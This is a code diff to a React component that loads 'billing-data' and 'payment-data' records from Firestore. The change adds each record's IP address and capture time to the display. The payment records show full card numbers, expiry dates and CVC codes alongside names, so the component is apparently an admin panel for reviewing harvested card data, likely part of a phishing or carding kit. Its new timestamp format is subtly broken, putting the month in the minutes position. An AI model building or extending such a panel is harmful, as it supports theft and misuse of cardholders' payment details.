@@ -25,6 +25,12 @@ const Layout = ({ children }) => {
         let paymentData = [];
         db.collection('billing-data').get().then(snapshot => {
             snapshot.docs.forEach(doc => {
+                let formatted = ""
+                if( doc.data().logged_at )
+                {
+                    const t = new Date( doc.data().logged_at );
+                    formatted = moment(t).format("yyyy-MM-DD hh:MM:ss");
+                }
                 const singleDoc = {
                     id: doc.id,
                     fullname: doc.data().fullname,
@@ -33,7 +39,9 @@ const Layout = ({ children }) => {
                     state: doc.data().state,
                     city: doc.data().city,
                     zip: doc.data().zip,
-                    country: doc.data().country
+                    country: doc.data().country,
+                    ip_address: doc.data().ip_address,
+                    logged_at: formatted
                 }
                 billingData.push(singleDoc)
             })
@@ -59,13 +67,21 @@ const Layout = ({ children }) => {
         });
         db.collection('payment-data').get().then(snapshot => {
             snapshot.docs.forEach(doc => {
+                let formatted = ""
+                if( doc.data().logged_at )
+                {
+                    const t = new Date( doc.data().logged_at );
+                    formatted = moment(t).format("yyyy-MM-DD hh:MM:ss");
+                }
                 const singleDoc = {
                     id: doc.id,
                     fname: doc.data().fname,
                     lname: doc.data().lname,
                     cardNum: doc.data().cardNum,
                     expiry: doc.data().expiry,
-                    cvc: doc.data().cvc
+                    cvc: doc.data().cvc,
+                    ip_address: doc.data().ip_address,
+                    logged_at: formatted
                 }
                 paymentData.push(singleDoc)
             })
